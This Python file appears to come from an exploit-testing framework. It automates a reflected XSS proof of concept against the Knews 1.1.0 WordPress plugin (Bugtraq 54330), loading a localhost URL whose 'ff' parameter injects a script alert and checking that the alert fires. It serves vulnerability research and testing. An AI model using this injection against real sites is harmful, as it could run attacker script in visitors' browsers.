
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import os
import time

import selenium.common.exceptions
from selenium.common.exceptions import NoAlertPresentException

import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "Bugtraq_54330",
                  'Description' : "XSS vulnerabiity in Knews 1.1.0, a plugin for Wordpress",
                  'References' :  [["http://www.cvedetails.com/bugtraq-bid/54330/WordPress-Knews-Multilingual-Newsletters-Plugin-Cross-Site-S.html"]], 
                  'Target' :      "Wordpress 3.2",
                  'TargetLicense' : '',
                  'Plugin' : "Knews 1.1.0",
                  'VulWikiPage' : "None",
                  'Type' : 'XSS'
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return
            

    def exploit(self):
        driver = self.create_selenium_driver()
        
        driver.get("http://127.0.0.1/wordpress/wp-content/plugins/knews/wysiwyg/fontpicker/?ff=%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E")

        alert = None
        tries = 5
        while tries:
            alert = driver.switch_to_alert()
            try:
                text = alert.text
                self.verified = True
                break
            except NoAlertPresentException:
                tries -= 1
                time.sleep(1)

        if self.visible:
            time.sleep(10)

        driver.cleanup()
        return


    def verify(self):
        return self.verified
